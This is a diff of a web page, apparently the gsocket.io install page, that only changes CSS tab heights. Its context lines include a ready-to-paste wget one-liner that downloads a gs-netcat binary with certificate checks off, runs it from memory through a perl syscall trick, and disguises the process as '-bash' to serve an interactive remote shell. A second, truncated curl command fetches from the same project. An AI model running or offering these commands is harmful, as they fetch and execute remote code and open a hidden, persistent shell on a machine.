@@ -112,7 +112,7 @@ GS_PORT=53 bash deploy-all.sh
         <div class="tab">
             <input type="radio" name="css-tabs-tricks" id="wget-tricks" class="tab-switch">
             <label for="wget-tricks" class="tab-label">Wget</label>
-            <div class="tab-content" style="height: 23.5rem;">
+            <div class="tab-content" style="height: 25.5rem;">
                 <ul>
                     <li><p><strong>Ignore SSL / Certificate warnings</strong></p>
 {% highlight shell %}
@@ -174,7 +174,7 @@ export GS_SECRET=ChangeMe GS_PORT=53; curl -SsfLk https://github.com/hackerschoi
         <div class="tab">
             <input type="radio" name="css-tabs-manual" id="wget-manual" class="tab-switch">
             <label for="wget-manual" class="tab-label">Wget</label>
-            <div class="tab-content" style="height: 10.5rem; padding-left: 1.2em;">
+            <div class="tab-content" style="height: 6.5rem; padding-left: 1.2em;">
 {% highlight shell %}
 export GS_SECRET=ChangeMe GS_PORT=53; wget --no-check-certificate -qOgs https://github.com/hackerschoice/gsocket.io/raw/refs/heads/gh-pages/bin/gs-netcat_mini-linux-$(uname -m) | GS_ARGS="-ilD" perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"-bash"';unset GS_SECRET GS_PORT
 {% endhighlight %}
